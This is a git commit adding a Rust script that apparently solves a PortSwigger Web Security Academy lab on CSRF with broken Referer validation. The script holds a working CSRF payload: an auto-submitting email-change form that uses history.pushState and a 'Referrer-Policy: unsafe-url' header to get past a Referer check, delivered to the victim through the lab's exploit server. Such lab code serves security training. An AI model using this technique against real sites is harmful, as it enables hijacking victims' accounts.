e44971a69560d84c6e3df92f7fb9193798ee3e51
Ahmed Elqalawii <elqalawii@proton.me>
2023-10-21 19:13:00 +0300

    Added 'CSRF with broken Referer validation' lab

---
+++ Cross-site request forgery (CSRF)/CSRF with broken Referer validation/src/main.rs
@@ -0,0 +1,110 @@
+/**********************************************************************************************
+*
+* Author: Ahmed Elqalawy (@elqal3awii)
+*
+* Date: 21/10/2023
+*
+* Lab: CSRF with broken Referer validation
+*
+* Steps: 1. Add the `Referrer-Policy` header to your exploit server response headers
+*        2. Craft an HTML form for changing the email address with an auto-submit 
+*           script that changes the Referer header value using the history.pushState() method
+*        3. Deliver the exploit to the victim
+*        4. The victim's email will be changed after he trigger the exploit
+*
+***********************************************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let lab_url = "https://0acf002f03d8047180534e6800ff00d5.web-security-academy.net";
+
+    // change this to your exploit server URL
+    let exploit_server_url = "https://exploit-0ab500b203b2040f804c4de0010c0099.exploit-server.net";
+
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // the header of your exploit sever response
+    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url";
+
+    // the new email
+    // you can change this to what you want
+    let new_email = "hacked@you.com";
+
+    // payload to change the victim's email
+    let payload = format!(
+        r###"<html>
+                <body>
+                <form action="{lab_url}/my-account/change-email" method="POST">
+                    <input type="hidden" name="email" value="{new_email}" />
+                    <input type="submit" value="Submit request" />
+                </form>
+                <script>
+                    history.pushState('', '', '/?{lab_url}');
+                    document.forms[0].submit();
+                </script>
+                </body>
+            </html>   
+      "###
+    );
+
+    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
+    io::stdout().flush();
+
+    // deliver the exploit to the victim
+    client
+        .post(exploit_server_url)
+        .form(&HashMap::from([
+            ("formAction", "DELIVER_TO_VICTIM"),
+            ("urlIsHttps", "on"),
+            ("responseFile", "/exploit"),
+            ("responseHead", exploit_server_head),
+            ("responseBody", &payload),
+        ]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to deliver the exploit to the victim".red()
+        ));
+
+    println!("{}", "OK".green());
+    println!(
+        "{}",
+        "🗹 The victim's email will be changed after he trigger the exploit".white()
+    );
+    println!(
+        "{} {}",
+        "🗹 Check your browser, it should be marked now as".white(),
+        "solved".green()
+    )
+}
+
+/*******************************************************************
+* Function used to build the client
+* Return a client that will be used in all subsequent requests
+********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::default())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
